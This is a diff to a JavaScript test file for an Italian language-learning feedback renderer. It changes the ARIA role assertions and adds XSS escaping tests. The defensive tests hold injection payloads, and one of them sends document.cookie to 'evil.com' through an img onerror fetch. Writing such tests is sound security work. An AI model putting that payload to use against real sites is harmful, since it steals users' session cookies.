@@ -83,13 +83,17 @@ assert(buildHTML(makeEval('ambiguous')).includes('?'),       'ambiguous: ?');
 assert(buildHTML(makeEval('correct_contextual')).includes('ⓘ'), 'contextual: ⓘ');
 
 // ── buildHTML: role ARIA ─────────────────────────────────────────────────────
+// Tutti gli stati usano role="status" + aria-live="polite".
+// role="alert" è riservato a errori tecnici, non a risposte sbagliate.
 console.log('\nbuildHTML — ARIA role:');
-assert(buildHTML(makeEval('correct_exact')).includes('role="status"'),  'correct: role=status');
-assert(buildHTML(makeEval('incorrect')).includes('role="alert"'),        'incorrect: role=alert');
-assert(buildHTML(makeEval('almost_correct_spelling')).includes('role="alert"'), 'almost: role=alert');
-assert(buildHTML(makeEval('ambiguous')).includes('role="status"'),       'ambiguous: role=status');
-assert(buildHTML(makeEval('correct_exact')).includes('aria-live="polite"'), 'correct: polite');
-assert(buildHTML(makeEval('incorrect')).includes('aria-live="assertive"'), 'incorrect: assertive');
+assert(buildHTML(makeEval('correct_exact')).includes('role="status"'),          'correct: role=status');
+assert(buildHTML(makeEval('incorrect')).includes('role="status"'),              'incorrect: role=status (non alert)');
+assert(buildHTML(makeEval('almost_correct_spelling')).includes('role="status"'),'almost: role=status (non alert)');
+assert(buildHTML(makeEval('ambiguous')).includes('role="status"'),              'ambiguous: role=status');
+assert(buildHTML(makeEval('correct_exact')).includes('aria-live="polite"'),     'correct: polite');
+assert(buildHTML(makeEval('incorrect')).includes('aria-live="polite"'),         'incorrect: polite (non assertive)');
+assert(buildHTML(makeEval('almost_correct_gender')).includes('aria-live="polite"'), 'almost_gender: polite');
+assert(!buildHTML(makeEval('incorrect')).includes('role="alert"'),              'incorrect: nessun role=alert');
 
 // ── buildHTML: titolo ────────────────────────────────────────────────────────
 console.log('\nbuildHTML — titolo:');
@@ -182,6 +186,46 @@ console.log('\nbuildHTML — XSS:');
     userAnswer: "l'occhio", targetAnswer: "l'orecchio",
     feedbackExplanation: "L'orecchio è maschile." }));
   assert(html.includes("L&#039;orecchio") || html.includes("L'orecchio"), 'apostrofi gestiti');
+}
+
+// ── XSS esteso ───────────────────────────────────────────────────────────────
+console.log('\nbuildHTML — XSS esteso:');
+{
+  const scriptTag = '<script>alert(1)<\/script>';
+  const html = buildHTML(makeEval('incorrect', {
+    userAnswer: scriptTag, targetAnswer: scriptTag, feedbackExplanation: scriptTag }));
+  assert(!html.includes('<script>'), 'script tag non eseguibile');
+  assert(html.includes('&lt;script&gt;'), 'script tag escaped');
+}
+{
+  const btnTag = '<button autofocus onclick=alert(1)>Continua</button>';
+  const html = buildHTML(makeEval('incorrect', { feedbackExplanation: btnTag }));
+  assert(!html.includes('<button autofocus'), 'button autofocus non iniettato');
+  assert(html.includes('&lt;button'), 'button escaped');
+}
+{
+  const special = '&<>"\'`';
+  const html = buildHTML(makeEval('incorrect', {
+    userAnswer: special, targetAnswer: special, feedbackExplanation: `Test: ${special}` }));
+  assert(html.includes('&amp;'),  '& → &amp;');
+  assert(html.includes('&lt;'),   '< → &lt;');
+  assert(html.includes('&gt;'),   '> → &gt;');
+  assert(html.includes('&quot;'), '" → &quot;');
+  assert(html.includes('&#039;'), "' → &#039;");
+}
+{
+  // Verifica che il titolo e la label siano escaped
+  const evilTitle = '<b onclick=alert()>Corretto</b>';
+  const html = buildHTML(makeEval('correct_exact', { feedbackTitle: evilTitle }));
+  assert(!html.includes('<b onclick'), 'titolo non esegue HTML');
+  assert(html.includes('&lt;b'), 'titolo escaped');
+}
+{
+  // Esempio con contenuto malevolo
+  const evilExample = '<img src=x onerror=fetch("evil.com?d="+document.cookie)>';
+  const html = buildHTML(makeEval('correct_synonym'), { example: evilExample });
+  assert(!html.includes('<img src=x'), 'esempio img non eseguibile');
+  assert(html.includes('&lt;img'), 'esempio escaped');
 }
 
 // ── STATUS_CFG completo ─────────────────────────────────────────────────────
